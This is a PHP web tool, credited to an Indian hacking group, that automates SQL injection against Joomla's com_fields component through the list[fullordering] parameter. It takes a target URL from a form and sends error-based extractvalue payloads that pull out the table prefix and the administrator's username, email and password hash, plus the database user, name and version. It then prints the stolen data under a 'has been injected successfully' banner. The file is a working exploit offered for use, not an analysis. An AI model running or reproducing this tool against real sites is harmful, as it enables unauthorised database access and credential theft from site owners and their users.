<?php
session_start();
error_reporting(0);
set_time_limit(0);
/* Coded By Manish At Indishell Lab*/
$head = '
<html>
<head>
<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLfLXmLeMSTt0jOXREfgvdp8IYWnE9_t49PpAiJNvwHTqnKkL4" rel="icon" type="image/x-icon"/>
</script>
<title>--==[[Mannu joomla SQL Injection exploiter by Team Indishell]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<STYLE>
body {
font-family: Tahoma;
color: white;
background: #333333;
}
input {
border            : solid 2px ;
border-color        : black;
BACKGROUND-COLOR: #444444;
font: 8pt Verdana;
color: white;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
#t input[type=\'submit\']{
    COLOR: White;
    border:none;
    BACKGROUND-COLOR: black;
}
#t input[type=\'submit\']:hover {

    BACKGROUND-COLOR: #ff9933;
    color: black;

}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 0px ;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 2px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: #191919;;
color: #FFF;
}
textarea {
border            : dashed 2px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
A:link {
border: 1px;
    COLOR: red; TEXT-DECORATION: none
}
A:visited {
    COLOR: red; TEXT-DECORATION: none
}
A:hover {
    color: White; TEXT-DECORATION: none
}
A:active {
    color: white; TEXT-DECORATION: none
}
</STYLE>
<script type="text/javascript">
<!--
    function lhook(id) {
       var e = document.getElementById(id);
       if(e.style.display == \'block\')
          e.style.display = \'none\';
       else
          e.style.display = \'block\';
    }
//-->
</script>
';
        echo $head ;
        echo '
<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

       <td width="100%" align=center valign="top" rowspan="1">
           <font color=#ff9933 size=5 face="comic sans ms">--==[[ Mannu ]]==--</font><br><font color=#ff9933 size=3 face="comic sans ms">--==[[ Joomla </font><font color=white size=3 face="comic sans ms">SQL Injection exploiter By Team </font><font color=green size=3 face="comic sans ms"> INDIShEll]]==--</font> <div class="hedr">
        <td height="10" align="left" class="td1"></td></tr><tr><td
        width="100%" align="center" valign="top" rowspan="1"><font
        color="red" face="comic sans ms"size="1"><b>
        <font color=#ff9933>
        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font><br><font color=white>
        -==[[Greetz to]]==--</font><br> <font color=#ff9933>Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba,
<br>Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
Hackuin,Alicks,mike waals<br>cyber gladiator,Cyber Ace,Golden boy INDIA,d3, rafay baloch, nag256
Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Dash<br>
<font color=white>--==[[Love to]]==--</font><br>My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,Gujjar PCP
Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Jagriti,Salty, Hacker fantastic, Jennifer Arcuri and Don(Deepika kaushik)<br>
<font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>GCE College ke DON :D</font>        <br></font>
        <b>
        <font color=#ff9933>
        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font>

           </table>
       </table>
';


function unhex($hex){
						for($i=0;$i<strlen($hex);$i+=2)
						   $str .= chr(hexdec(substr($hex,$i,2)));
						return $str;
					}

 function data($lu)
		{
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $lu);
			curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
			$result['EXE'] = curl_exec($ch);
			curl_close($ch);
			return $result['EXE'];
		}

?>

<div align=center>
<img src="https://web.archive.org/web/20160206014924/http://www.freesmileys.org/smileys/smiley-cool21.gif">
<font size=4 color=white face="comic sans ms">--==[[ code for India ]]==-- </font>
<img src="https://web.archive.org/web/20160206014924/http://www.freesmileys.org/smileys/smiley-flag010.gif">
<br><br>
<form method=post>
	<input type=input name=in value=target>
	<input type=submit name=sm value="Exploit it">
</form>

<?php
if(isset($_POST['sm']))
{
$target=trim($_POST['in']);


$inject=$target.'/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=';


$payload='1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,hex(table_name),0x7e7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)))=1';
$final_url=$inject.$payload;
$data_extracted=data($final_url);

$de0=explode("~~~", $data_extracted);
$de1=explode("~~~", $de0[1]);
$def=trim($de1[0]);

$table_name=unhex($def);
echo 'Table names used for grabbing database table prefix ->'.$table_name;
echo '<br>';

$prefix=explode('_',$table_name);
$total_char=10;
$start=1;
$loop_end=false;


while($loop_end!=true)
	{



	$payload2='1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(password,'.$start.','.$total_char.'),0x7e7e7e)/**/from/**/'.$prefix[0].'_users/**/limit/**/0,1)))=1';
	$final_url=$inject.$payload2;

	 $data_extracted=data($final_url);
	$de0=explode("~~~", $data_extracted);
	$de1=explode("~~~", $de0[1]);
	 $ddd.=trim($de1[0]);
	if(trim($de1[0])=='')
	{
	break;
	$loop_end=true;

	}
	$i=$i+1;
	$start=$start+10;

	}


	$username='1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(username,1,20),0x7e7e7e)/**/from/**/'.$prefix[0].'_users/**/limit/**/0,1)))=1';
	$final_url=$inject.$username;
	$data_extracted=data($final_url);
	$de0=explode("~~~", $data_extracted);
	$de1=explode("~~~", $de0[1]);
	$user_name=trim($de1[0]);

	$email='1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(email,1,20),0x7e7e7e)/**/from/**/'.$prefix[0].'_users/**/limit/**/0,1)))=1';
	$final_url=$inject.$email;
	$data_extracted=data($final_url);
	$de0=explode("~~~", $data_extracted);
	$de1=explode("~~~", $de0[1]);
	$email=trim($de1[0]);

	$dbuser='1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(user(),1,20),0x7e7e7e))))=1';
	$final_url=$inject.$dbuser;
	$data_extracted=data($final_url);
	$de0=explode("~~~", $data_extracted);
	$de1=explode("~~~", $de0[1]);
	$db_user=trim($de1[0]);

	$dbname='1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(database(),1,20),0x7e7e7e))))=1';
	$final_url=$inject.$dbname;
	$data_extracted=data($final_url);
	$de0=explode("~~~", $data_extracted);
	$de1=explode("~~~", $de0[1]);
	$db_name=trim($de1[0]);

	$dbversion='1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(version(),1,20),0x7e7e7e))))=1';
	$final_url=$inject.$dbversion;
	$data_extracted=data($final_url);
	$de0=explode("~~~", $data_extracted);
	$de1=explode("~~~", $de0[1]);
	$db_version=trim($de1[0]);


	if($email!='' || $user_name!='' || $ddd!='')
	{
	echo 'Target <a href="'.$target.'">'.$target.'</a> has been injected successfully, find username, email and password given below<br><br>';

	echo '<table width=80% style="border:0px; background-color : transparent;">';
	echo '<tr><td align=right width=20%>Database username is -> </td><td align=left width=80%><font color=#f9e79f>'.$db_user;
	echo '</font></td></tr>';
	echo '<tr><td align=right width=20%>Database name is -> </td><td align=left width=80%><font color=#f9e79f>'.$db_name;
	echo '</font></td></tr>';
	echo '<tr><td align=right width=20%>Database version is -> </td><td align=left width=80%><font color=#f9e79f>'.$db_version;
	echo '</font></td></tr>';
	echo '<tr><td align=right width=20%>Username is -> </td><td align=left width=80%><font color=#f9e79f>'.$user_name;
	echo '</font></td></tr>';
	echo '<tr><td align=right width=20%>Email is -> </td><td align=left width=80%><font color=#f9e79f>'.$email;
	echo '</font></td></tr>';
	echo '<tr><td align=right width=20%>Password hash is -> </td><td align=left width=80%><font color=#f9e79f>'.$ddd;
	echo '</font></td></tr></table>';
	}



}



?>